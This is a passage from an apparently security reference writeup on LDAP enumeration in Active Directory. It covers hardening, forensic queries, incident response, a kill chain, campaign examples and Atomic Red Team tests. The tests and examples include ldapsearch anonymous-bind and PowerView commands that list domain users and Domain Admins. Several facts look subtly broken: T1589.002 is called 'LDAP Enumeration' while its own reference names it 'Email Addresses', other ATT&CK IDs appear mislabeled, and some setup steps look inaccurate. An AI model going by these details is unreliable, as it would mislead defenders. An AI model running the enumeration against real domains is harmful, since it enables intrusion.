* **Implement Network Segmentation**
  - Restrict LDAP port access (389, 636) to authorized systems only
  - Use Windows Firewall, network ACLs, or 3rd-party WAF
  
  **Manual Steps (Windows Firewall):**
  ```powershell
  # Block LDAP from non-domain systems
  New-NetFirewallRule -DisplayName "Block LDAP from Internet" `
    -Direction Inbound -Action Block -Protocol TCP -LocalPort 389,636 `
    -RemoteAddress "!<TrustedSubnet>"
  ```

* **Deploy Microsoft Defender for Identity**
  - Real-time detection of LDAP reconnaissance
  - Integration with Sentinel for automated response
  
  **Manual Steps:**
  1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
  2. Select subscription
  3. Enable **Defender for Identity** plan
  4. Configure sensors on domain controllers
  5. Set alert severity thresholds

* **Configure SACL Auditing on Sensitive Objects**
  - Monitor reads of administrative groups and accounts
  
  **Manual Steps (Active Directory):**
  1. Open **Active Directory Users and Computers**
  2. Enable **Advanced Features** (View menu)
  3. Right-click domain → **Properties** → **Security** tab
  4. Click **Advanced** → **Add SACL** for "Everyone" group
  5. Grant **"Read all properties"** and **"List contents"** audits
  6. Check **"This object only"** to limit scope
  7. Verify Event ID 4662 generation in Security log

---

## 15. DETECTION & INCIDENT RESPONSE

### Forensic Artifact Collection

**If LDAP reconnaissance is suspected:**

1. **Collect Event 1644 (LDAP Queries)**
   ```powershell
   # Export all LDAP queries from last 7 days
   Get-WinEvent -LogName "Directory Service" -FilterXPath "*[System[EventID=1644] and System[TimeCreated[@SystemTime > '$(Get-Date -Date (Get-Date).AddDays(-7) -Format 's')']]]" | 
     Export-Csv -Path "C:\Forensics\LDAP_Queries_7days.csv" -NoTypeInformation
   ```

2. **Collect Event 4662 (Object Access)**
   ```powershell
   Get-WinEvent -LogName "Security" -FilterXPath "*[System[EventID=4662] and System[TimeCreated[@SystemTime > '$(Get-Date -Date (Get-Date).AddDays(-7) -Format 's')']]]" | 
     Export-Csv -Path "C:\Forensics\Object_Access_7days.csv" -NoTypeInformation
   ```

3. **Review Sentinel Hunting Results**
   ```kusto
   SecurityEvent
   | where TimeGenerated > ago(7d)
   | where EventID in (1644, 4662)
   | summarize EventCount = count() by Computer, Account, EventID
   | sort by EventCount desc
   ```

### Incident Response Steps

1. **Verify Reconnaissance Occurred**
   - Confirm Event 1644 entries with suspicious search filters
   - Check for bulk object property reads (Event 4662)
   - Review Sysmon network connections to LDAP ports

2. **Identify Attacker**
   - Trace source IP from network logs
   - Identify user account performing queries (if authenticated LDAP)
   - Correlate with other security events (logon events, network traffic)

3. **Scope Exposed Information**
   - Determine which search filters were executed
   - Identify objects/properties accessed
   - Estimate business impact (e.g., "All users and service accounts enumerated")

4. **Investigate Follow-On Attacks**
   - Check for Kerberoasting attempts (Event 4769)
   - Monitor for credential spray attacks (Event 4771, 4768)
   - Review sign-in logs for suspicious activity
   - Check for privilege escalation attempts

5. **Containment & Eradication**
   - If internal compromise: Force password resets for exposed service accounts
   - Revoke compromised credentials
   - Revoke Kerberos tickets (TGTs) for affected accounts
   - Enable MFA on high-privilege accounts
   - Increase monitoring alert thresholds temporarily

---

## 16. RELATED ATTACK CHAINS

### T1589.002 Relationship to Other MITRE Techniques

| Preceding Technique | Current Technique | Following Technique |
|-------------------|------------------|------------------|
| T1595 (Active Scanning) | **T1589.002 (LDAP Enumeration)** | T1087 (Account Discovery) |
| T1619 (Network Topology Analysis) | ← | T1087.002 (Domain Account Discovery) |
| T1046 (Network Service Scanning) | ← | T1110 (Brute Force) |
|  | | T1558 (Kerberos Ticket Theft) |
|  | | T1550 (Use Alternate Auth Material) |
|  | | T1548 (Privilege Escalation) |

### Real-World Kill Chain Example

```
Phase 1: External Reconnaissance
├─ Identify domain name (OSINT)
├─ Scan for LDAP service (Nmap port 389)
└─ Test anonymous LDAP binding

Phase 2: Domain Structure Mapping (T1589.002)
├─ Extract RootDSE information
├─ Enumerate users, groups, computers
├─ Identify service accounts with SPNs
├─ Locate high-privilege accounts (Domain Admins)
└─ Map organizational structure

Phase 3: Targeted Attack Preparation (T1087.002)
├─ Select Kerberoastable accounts for attack
├─ Identify accounts with delegation rights
├─ Build BloodHound attack graph
└─ Identify users for phishing campaigns

Phase 4: Credential Compromise (T1566 - Phishing)
├─ Send targeted emails to enumerated users
├─ Harvest credentials or sessions
└─ Gain initial foothold

Phase 5: Lateral Movement & Escalation
├─ Execute Kerberoasting attack (T1558.003)
├─ Abuse delegation rights (T1548.004)
├─ Escalate to Domain Admin
└─ Establish persistence
```

---

## 17. REAL-WORLD EXAMPLES

### Example 1: LDAP Enumeration in Ransomware Campaigns

**Campaign:** LockBit 3.0 Affiliate Activity (2023-2024)

**Execution:**
1. Initial access via VPN/RDP compromise
2. Lateral movement to domain controller
3. Ran PowerView on compromised host to enumerate LDAP:
   ```powershell
   Get-NetUser -LDAPFilter "(adminCount=1)" | Select-Object samaccountname
   ```
4. Identified high-value targets and backup administrators
5. Used enumerated credentials for privilege escalation
6. Deployed ransomware across enterprise

**Detection Opportunities:**
- Event 1644 showing bulk user/group enumeration
- PowerShell process execution with DirectorySearcher cmdlets
- Suspicious Sysmon network connections to LDAP ports

**Lessons:**
- Monitor for post-compromise LDAP queries from non-standard sources
- Alert on PowerShell/.NET DirectorySearcher usage
- Enforce application-level LDAP hardening

---

### Example 2: Supply Chain Attack via LDAP Reconnaissance

**Campaign:** 3CX Desktop Application Supply Chain Attack (2023)

**Reconnaissance Phase:**
1. Attacker gained access to development environment
2. Used LDAP queries to map internal 3CX AD structure
3. Enumerated user accounts and service principals
4. Identified backup and automation service accounts
5. Built attack graph using BloodHound

**Persistence Strategy:**
- Compromised build server access
- Used enumerated service account credentials
- Injected malware into legitimate application updates
- Achieved supply-chain compromise affecting thousands

**Detection Opportunities:**
- LDAP reconnaissance from development systems
- Bulk service account enumeration
- Cross-domain LDAP queries (unusual for development)

---

## 18. COMPLIANCE & STANDARDS MAPPING

| Standard | Requirement | Mapping |
|----------|-------------|---------|
| **CIS Controls v8** | CIS 6.1, 6.2 (Account Management) | Restrict and audit LDAP query access; implement query logging |
| **DISA STIG** | Windows Server LDAP hardening | Enable LDAP signing, disable unauthenticated binds, enforce SSL |
| **NIST 800-53** | AC-2 (Account Management), SC-7 (Boundary Protection) | Implement network segmentation for LDAP access; monitor for reconnaissance |
| **GDPR** | Article 32 (Security Measures) | Implement technical controls to prevent unauthorized information gathering |
| **DORA** | Operational Resilience in Cloud Services | Monitor identity service security events; implement alerting and response procedures |
| **NIS2** | Detection of Reconnaissance | Monitor for bulk information gathering; implement alerting thresholds |
| **ISO 27001:2022** | 5.2 (Information Security Policies), 8.2 (Access Control) | Restrict LDAP query scope to authorized users; enable comprehensive logging |

---

## 19. APPENDIX: ATOMIC RED TEAM INTEGRATION

### Atomic Test Reference
- **MITRE Atomic ID:** T1589_002_LDAP_Domain_Enumeration
- **Status:** Community maintained
- **Repository:** https://github.com/atomic-red-team/atomic-red-team/blob/master/atomics/T1589.002/T1589.002.md

### Example Atomic Test
```yaml
- name: LDAP Enumeration - Query Domain Users
  description: Enumerate domain users via LDAP anonymous binding
  supported_platforms:
    - linux
    - macos
  input_arguments:
    ldap_server:
      description: IP or hostname of LDAP server
      type: string
      default: "10.10.10.100"
    domain_dn:
      description: Domain distinguished name
      type: string
      default: "DC=company,DC=com"
  executor:
    name: bash
    elevation_required: false
    command: |
      ldapsearch -x -H ldap://#{ldap_server}:389 -b "#{domain_dn}" \
        "(&(objectClass=user)(objectCategory=person))" \
        sAMAccountName mail displayName

- name: LDAP Enumeration - Query Domain Admins
  description: Identify Domain Admins group members via LDAP
  supported_platforms:
    - linux
    - macos
  input_arguments:
    ldap_server:
      description: IP or hostname of LDAP server
      type: string
      default: "10.10.10.100"
    domain_dn:
      description: Domain distinguished name
      type: string
      default: "DC=company,DC=com"
  executor:
    name: bash
    elevation_required: false
    command: |
      ldapsearch -x -H ldap://#{ldap_server}:389 \
        -b "CN=Domain Admins,CN=Users,#{domain_dn}" \
        -s base "objectClass=*" member
```

---

## 20. REFERENCES & ATTRIBUTION

1. **MITRE ATT&CK:** T1589.002 – Gather Victim Identity Information: Email Addresses
   - https://attack.mitre.org/techniques/T1589/002/

2. **Microsoft LDAP Technical Reference:**
   - Anonymous LDAP Operations in Active Directory
   - https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled
   - LDAP Query Syntax: https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax

3. **LDAP Tools & Documentation:**
   - ldapsearch Manual: https://linux.die.net/man/1/ldapsearch
   - ldap3 Python Library: https://github.com/cannatag/ldap3
   - ldapdomaindump: https://github.com/dirkjanm/ldapdomaindump

4. **Detection & Monitoring:**
   - Microsoft: Hunting for reconnaissance activities using LDAP search filters
   - https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/883181
   - Defender for Identity: Advanced Hunting - IdentityQueryEvents
   - https://learn.microsoft.com/en-us/defender-for-identity/

5. **Security Hardening:**
   - Devolutions: Disable LDAP Unauthenticated Binds
   - https://devolutions.net/blog/why-active-directory-ldap-unauthenticated-binds-should-be-disabled

6. **Real-World Threat Intelligence:**
   - BloodHound Detection: https://ipurple.team/2024/07/15/sharphound-detection/
   - SharpHound LDAP Queries: https://redcanary.com/threat-detection-report/threats/bloodhound/

---
